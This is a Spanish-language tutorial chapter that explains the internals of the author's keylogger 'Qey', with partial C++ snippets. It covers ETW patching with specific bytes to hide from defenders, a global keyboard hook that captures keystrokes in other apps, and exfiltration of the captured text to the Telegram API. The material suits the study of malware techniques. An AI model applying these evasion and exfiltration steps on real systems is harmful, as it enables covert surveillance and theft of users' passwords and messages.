---
title: "6. Analizando el KeyLogger"
date: 2026-05-02 12:00:00 -0500
categories: ["Fundamentos de Ejecución en Windows: PEB, Gestión de Memoria y Técnicas de Hooking."]
tags: [windows, keylogger, hooking, malware, c++]
---

Para entender cómo nuestro keylogger captura teclas que el usuario escribe en _otra_ aplicación (como un navegador o un cliente de correo), primero debemos visualizar cómo viaja una tecla en Windows.

Cuando presionas la letra "A", el hardware del teclado envía una interrupción eléctrica a la CPU. El Kernel (anillo 0) la atrapa y determina qué ventana está activa en ese momento. Luego, empaqueta esa interrupción en un "mensaje" (llamado `WM_KEYDOWN`) y lo envía a la cola de mensajes privada del proceso dueño de esa ventana.

Bajo la regla del aislamiento de memoria virtual el proceso Qey no tiene forma de asomarse a la memoria del navegador para ver ese mensaje. Son estacionamientos distintos.

¿Cómo lo resolvemos? No intentamos romper el muro del estacionamiento; le pedimos al sistema de correos que nos entregue una copia antes.

La función `SetWindowsHookEx` con el parámetro `WH_KEYBOARD_LL` actúa como una **escucha telefónica en la central del sistema**. Le dice al subsistema de Windows: _"Antes de que entregues cualquier mensaje de teclado a su destinatario final en el anillo 3, haz una pausa, desvíalo temporalmente hacia mi función, déjame leerlo, y luego continúa la entrega"_.

El sistema operativo, asumiendo que somos un software legítimo (como una herramienta de accesibilidad o un atajo de teclado global), obedece.

### Desglose Estructural: Paso a Paso

Todo concepto técnico de la arquitectura de nuestro keylogger se basa en una secuencia lógica de preparación, ejecución y exfiltración.

#### 1. Inducción de Ceguera (ETW Patching)

Antes de realizar cualquier acción ruidosa (como instalar persistencia o levantar un hook global), el proceso debe silenciar su propia telemetría. 

C++

```
void PatchETW() {
    DWORD oldProtect;
    unsigned char patch[] = { 0x48, 0x33, 0xC0, 0xC3 }; // xor eax, eax; 
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    // ...
```

En la convención de llamadas estándar de Windows (x64 calling convention), cuando una función termina, el sistema operativo busca el resultado de esa función en un lugar específico: el registro **RAX** (o **EAX** para 32 bits). Si `EtwEventWrite` devuelve `0`, el sistema interpreta eso como `ERROR_SUCCESS`. Le estamos diciendo al proceso: _"Todo salió perfecto, el evento se registró, sigue con tu vida"_. Si devolviéramos otra cosa, podríamos causar un _crash_ o levantar sospechas. Necesitamos poner ese registro a cero.

 Cuando se parchea la memoria en vivo, el espacio es crítico. 

- La instrucción `xor eax, eax` (o su variante de 64 bits) ocupa apenas **2 a 3 bytes**.

 Los procesadores modernos no ejecutan las instrucciones una por una de forma lineal; usan algo llamado _ejecución fuera de orden_ y _renombramiento de registros_. Si el procesador lee un `mov eax, 0`, tiene que esperar a saber qué había antes en EAX para mantener la coherencia del estado. Pero Intel y AMD implementaron algo llamado **"Zeroing Idioms"** a nivel de silicio. Cuando el procesador lee un `xor reg, reg` (o un `sub reg, reg`), se da cuenta de que el resultado _siempre_ será cero, sin importar lo que hubiera antes. Sabe que cualquier valor operado con un XOR contra sí mismo se anula. Al detectar esto, la CPU rompe la cadena de dependencias con las instrucciones anteriores. No espera. No lee el estado previo de EAX. Simplemente asigna un registro físico nuevo con valor cero. Es computacionalmente más rápido y eficiente.

El código no cruza al kernel. Busca la DLL `ntdll.dll` que ya está mapeada en su propio espacio de memoria (como vimos en el PEB,). Localiza la dirección de memoria exacta de la función `EtwEventWrite`.

Como el espacio de memoria le pertenece, usa `VirtualProtect` para cambiar temporalmente los permisos de esa sección de memoria a `PAGE_EXECUTE_READWRITE`. Acto seguido, inyecta los 4 bytes críticos (`0x48, 0x33, 0xC0, 0xC3`) sobreescribiendo el inicio de la función.

A partir de este instante de reloj, cualquier intento del propio sistema, o de librerías inyectadas como AMSI, de reportar el comportamiento de Qey a través de ETW, simplemente retornará un éxito falso. El proceso se ha vuelto opaco para los defensores en modo usuario.

#### 2. Asegurando la Singularidad (El Mutex)

C++

```
HANDLE hMutex = CreateMutexA(NULL, FALSE, "QeyGlobalMutex_v2");
if (GetLastError() == ERROR_ALREADY_EXISTS) { return 0; }
```

Un error de diseño común es ejecutar múltiples instancias del mismo código, creando ruido innecesario o bloqueando archivos. Un Mutex (Mutual Exclusion) es un objeto del kernel. Al solicitar su creación, el kernel verifica si ese nombre ya existe. Si la respuesta es afirmativa (`ERROR_ALREADY_EXISTS`), Qey entiende que un clon ya está operando y se auto-termina silenciosamente, garantizando una huella mínima.

#### 3. El Gancho Global (El Puente Temporal)

C++

```
keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
```

Aquí se materializa la escucha telefónica. `WH_KEYBOARD_LL` (Low Level) significa que el hook opera a nivel del hilo de entrada del sistema. A diferencia de otros hooks que requieren inyectar una DLL en cada proceso activo (lo cual es ruidoso y peligroso), este hook permite que el _callback_ (`KeyboardProc`) resida en el espacio de memoria de Qey.

El núcleo de esta operación es la función `CallNextHookEx(keyboardHook, nCode, wParam, lParam);` al final de la rutina de captura. Si el desarrollador olvida incluir esto, la tecla nunca llega a su destino original. El teclado del usuario "dejaría de funcionar", violando la regla principal del análisis sigiloso: **no alterar el entorno observable**.

#### 4. Análisis Cíclico y Memoria Segura

Dentro de `KeyboardProc`, el código evalúa la tecla atrapada. Pero se enfrenta a un problema de arquitectura de hilos: la función del hook debe ser ridículamente rápida, de lo contrario, el sistema operativo notará el retraso en la escritura del usuario y destruirá el hook.

Por ello, el diseño separa la captura de la exfiltración utilizando un hilo fantasma y mecanismos de sincronización:

C++

```
lock_guard<mutex> lock(mtx);
keyBuffer += windowHeader + keyStr;
```

Mientras el hilo del hook captura las teclas a velocidad de milisegundos, bloquea el acceso a la variable `keyBuffer` con un `lock_guard`. Esto es fundamental: si el hilo que envía el mensaje a Telegram intentara leer el buffer en el mismo nanosegundo que el hook está escribiendo una letra, el espacio de memoria colisionaría y el programa colapsaría.

#### 5. Exfiltración Asíncrona (El Tráfico Legítimo)

C++

```
void TelegramLoop() {
    while (true) {
        this_thread::sleep_for(chrono::seconds(20));
        // ... WinHttpSendRequest a api.telegram.org
```

Finalmente, un hilo separado (`TelegramLoop`) despierta cada 20 segundos. Toma el contenido asegurado, limpia el buffer y utiliza la librería nativa `WinHTTP` para realizar una petición POST a la API de Telegram.